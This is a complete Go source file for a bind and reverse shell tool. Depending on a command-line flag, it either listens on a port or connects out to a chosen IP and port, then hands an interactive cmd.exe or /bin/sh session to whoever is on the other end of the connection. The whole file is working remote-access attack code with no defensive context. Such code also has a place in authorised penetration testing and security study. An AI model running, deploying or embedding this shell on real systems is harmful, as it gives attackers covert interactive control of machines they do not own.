package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

// Checks the current OS and returns the appropriate base shell.
func pick_shell() *exec.Cmd {
	os := runtime.GOOS
	if os == "windows" {
		cmd := exec.Command("cmd.exe")
		return cmd
	} else {
		// This might not cover EVERYTHING, but it should handle linux, MacOSX, and BSD variants to my knowledge If needed, it can be extended fairly easily.
		cmd := exec.Command("/bin/sh", "-i")
		return cmd
	}
}

// Handles interaction with the chosen shell.
func handle(conn net.Conn) {
	cmd := pick_shell()
	rp, wp := io.Pipe()
	erp, ewp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	// Copies over Stderr to the connection as well. It's nice for quality of life.
	cmd.Stderr = ewp
	go io.Copy(conn, rp)
	go io.Copy(conn, erp)
	cmd.Run()
	conn.Close()
}

func main() {
	var port string
	var ip_address string
	var variety string

	flag.StringVar(&port, "p", "1234", "Port to connect or listen on")
	flag.StringVar(&ip_address, "s", "", "Server to connect to or address to listen on.")
	flag.StringVar(&variety, "t", "reverse", "Type of shell to set up, bind or reverse.")
	flag.Parse()

	if ip_address == "" {
		log.Println("Error: Must specify an IP address to connect to.")
		os.Exit(1)
	}

	switch variety {
	case "bind":
		str := []string{ip_address, ":", port}
		target := strings.Join(str, "")
		listner, err := net.Listen("tcp", target)
		if err != nil {
			log.Fatalln("Unable to bind to port")
			fmt.Printf("%s", err)
		}

		for {
			conn, err := listner.Accept()
			if err != nil {
				log.Fatalln("Unable to accept connection")
				fmt.Printf("%s", err)
			}
			handle(conn)
		}

	case "reverse":
		str := []string{ip_address, ":", port}
		target := strings.Join(str, "")
		conn, err := net.Dial("tcp", target)
		if err != nil {
			log.Fatalln("Unable to connect to target.")
			fmt.Printf("%s", err)
		}
		handle(conn)
	default:
		fmt.Printf("Please provided required arguments. See '-h' for help.")
	}

}

// This works but feels a bit dirty to me. I'm not sure how I could smooth it out right off though.
